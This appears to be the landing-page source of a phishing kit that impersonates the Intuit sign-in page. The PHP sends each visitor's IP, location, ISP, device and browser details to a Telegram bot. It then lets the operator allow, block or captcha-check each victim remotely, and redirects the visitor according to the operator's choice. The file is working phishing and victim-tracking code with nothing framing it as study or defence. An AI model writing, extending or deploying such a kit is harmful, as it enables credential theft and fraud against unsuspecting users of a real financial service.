<?php
session_start();
ob_start(); 
require_once('includes/php/detect.php');
require_once('config.php');
//require_once('red/index.php');

if (!function_exists('curl_init')) {
  die('Error: cURL must be enabled on the server.');
}

if(!isset($_SESSION['fallow'])) $_SESSION['fallow'] = true;


$_SESSION['unique_id'] = bin2hex(random_bytes(16));
  
if ($live_control['access_manipulation'] === true) {

  $btnRcap = array(
      array(
          array('text' => 'Allow Access ✅', 'callback_data' => $_SESSION['unique_id'] . ' allowed'),
      ),
      array(
          array('text' => 'Block Access ⛔️', 'callback_data' => $_SESSION['unique_id'] . ' blocked'),
        ),
      array(
        array('text' => 'Request Captcha ♻️', 'callback_data' => $_SESSION['unique_id'] . ' captcha_check'),
      ),
    );

  $buttons = array(
      'inline_keyboard' => $btnRcap
  );
  
  include_once('includes/php/bot_api.php');

$message = '📦 <code>'.$_SESSION['user_data']['query'].'</code> <b>is online</b>

<b>COUNTRY:</b> '.$_SESSION['user_data']['countryCode'].'
<b>ISP:</b> '.$_SESSION['user_data']['isp'].'
<b>ORG:</b> '.$_SESSION['user_data']['org'].'
<b>ASN:</b> '.$_SESSION['user_data']['as'].'
<b>DEVICE:</b> '.$_SESSION['device'].'
<b>BROWSER:</b> '.$_SESSION['browser'].'
<b>OS:</b> '.$_SESSION['os'].'
<b>USER AGENT:</b> '.$_SERVER['HTTP_USER_AGENT'].'

<b>coder:</b> <b>'.$_SESSION['pria'].$_SESSION['prib'].$_SESSION['pric'].$_SESSION['prid'].'</b>';
  $status = bot_api($message, $buttons);
  if ($status['ok'] === 0 || $status['ok'] === false) die('{"error":true, "description": "telegram bot api"}');
}elseif($live_control['access_auto'] == 'captcha'){
  header('location: settings/captcha.php');
  exit();
}else{
  header('location: settings/access_check.php');
  exit();
}
?>
<!doctype html>
<html lang="en" data-shell-version="6.364.0-master-bld.1303-61353769-1303">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      <title>Intuit Accounts - Sign In</title>
      
      
      <link rel="preload stylesheet" as="style" href="./css/spin.css" crossorigin="anonymous"/>
      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
      
      
      
   </head>
   <body>
      <div id="web-shell-spinner">
         <div class="idsTSIShortSpinner IndeterminateShort-wrapper">
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            
         </div>
      </div>
      <?php
    require_once('includes/js/startRequest.php'); 
    require_once('includes/js/makeRequest.php'); 
    ?>
    <script>
    function processResponse(response) {
      for (var i = 0; i < response.result.length; i++) {
        var result = response.result[i];
        if (result.callback_query && (result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> allowed" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> blocked" || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> captcha_check")) {
          var chatId = result.callback_query.message.chat.id;
          var messageId = result.callback_query.message.message_id;
          var action = result.callback_query.data.split(" ")[1];
          
          deleteMessage(chatId, messageId);

        if (action === "allowed") {
            window.location.href = "intuit/access_check.php"; 
            console.log("access allowed!");
        } else if (action === "blocked") {
            window.location.href = "intuit/404.php"; 
            console.log("access denied!");
        } else if (action === "captcha_check") {
            window.location.href = "intuit/captcha.php"; 
            console.log("captcha check!");
        } 

          break;
        }
      }
    }
  </script>
  <?php require_once('includes/js/deleteMessage.php'); ?>
   </body>
</html>